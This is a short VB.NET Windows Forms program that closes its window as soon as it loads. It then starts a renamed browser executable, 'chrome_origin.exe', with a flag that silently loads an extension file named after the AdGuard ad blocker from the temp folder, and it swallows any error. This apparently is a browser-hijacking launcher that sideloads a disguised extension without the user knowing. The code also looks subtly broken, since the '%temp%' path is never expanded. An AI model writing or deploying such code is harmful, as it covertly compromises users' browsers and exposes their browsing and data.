Public Class Form1

    Sub arg()
        Dim location As String = System.Environment.GetCommandLineArgs()(0)
        Dim appName As String = "chrome_origin.exe"
        Dim app_path As String = AppDomain.CurrentDomain.BaseDirectory + appName.ToString



        Dim go_herald = New ProcessStartInfo(app_path)
        go_herald.Arguments = "--load-extension='%temp%\adguard.crx'"
        Try
            Process.Start(go_herald)
        Catch ex As Exception

        End Try


    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Close()
        arg()
    End Sub
End Class
